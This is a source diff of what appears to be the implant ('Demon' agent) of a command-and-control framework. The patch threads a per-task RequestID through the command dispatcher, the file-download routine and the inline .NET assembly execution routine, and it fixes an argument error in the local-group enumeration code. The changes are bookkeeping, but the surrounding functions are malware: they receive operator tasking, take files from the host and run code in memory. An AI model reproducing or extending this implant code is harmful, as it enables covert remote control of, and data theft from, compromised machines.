@@ -51,6 +51,7 @@ VOID CommandDispatcher( VOID )
     LPVOID   TaskBuffer     = NULL;
     UINT32   TaskBufferSize = 0;
     UINT32   CommandID      = 0;
+    UINT32   RequestID      = 0;
 
     PRINTF( "Session ID => %x\n", Instance.Session.AgentID );
 
@@ -102,12 +103,15 @@ VOID CommandDispatcher( VOID )
             ParserNew( &Parser, DataBuffer, DataBufferSize );
             do
             {
+                RequestID  = ParserGetInt32( &Parser );
                 CommandID  = ParserGetInt32( &Parser );
                 TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );
 
+                Instance.CurrentRequestID = RequestID;
+
                 if ( CommandID != DEMON_COMMAND_NO_JOB )
                 {
-                    PRINTF( "Task => CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", CommandID, CommandID, TaskBuffer, TaskBufferSize )
+                    PRINTF( "Task => RequestID:[%d : %x] CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", RequestID, RequestID, CommandID, CommandID, TaskBuffer, TaskBufferSize )
                     if ( TaskBufferSize != 0 )
                     {
                         ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
@@ -794,6 +798,8 @@ VOID CommandFS( PPARSER Parser )
                 Download = DownloadAdd( hFile, FileSize );
             else
                 Download = DownloadAdd( hFile, FileSize );
+
+            Download->RequestID = Instance.CurrentRequestID;
 
             /*
 			 * Download Header:
@@ -1610,8 +1616,9 @@ VOID CommandAssemblyInlineExecute( PPARSER Parser )
         BUFFER AssemblyData = { 0 };
         BUFFER AssemblyArgs = { 0 };
 
-        Instance.Dotnet          = NtHeapAlloc( sizeof( DOTNET_ARGS ) );
-        Instance.Dotnet->Invoked = FALSE;
+        Instance.Dotnet            = NtHeapAlloc( sizeof( DOTNET_ARGS ) );
+        Instance.Dotnet->RequestID = Instance.CurrentRequestID;
+        Instance.Dotnet->Invoked   = FALSE;
 
         /* Parse Pipe Name */
         Buffer.Buffer = ParserGetBytes( Parser, &Buffer.Length );
@@ -2241,7 +2248,7 @@ VOID CommandNet( PPARSER Parser )
         
 
                         PackageAddBytes( Package, GroupInfo[ i ].lgrpi1_name, StringLengthW( GroupInfo[ i ].lgrpi1_name ) * 2 );
-                        PackageAddBytes( Package, Desc, GroupInfo[ i ].lgrpi1_comment, StringLengthW( GroupInfo[ i ].lgrpi1_comment ) * 2 );
+                        PackageAddBytes( Package, GroupInfo[ i ].lgrpi1_comment, StringLengthW( GroupInfo[ i ].lgrpi1_comment ) * 2 );
                     }
 
                     Instance.Win32.NetApiBufferFree( GroupInfo );
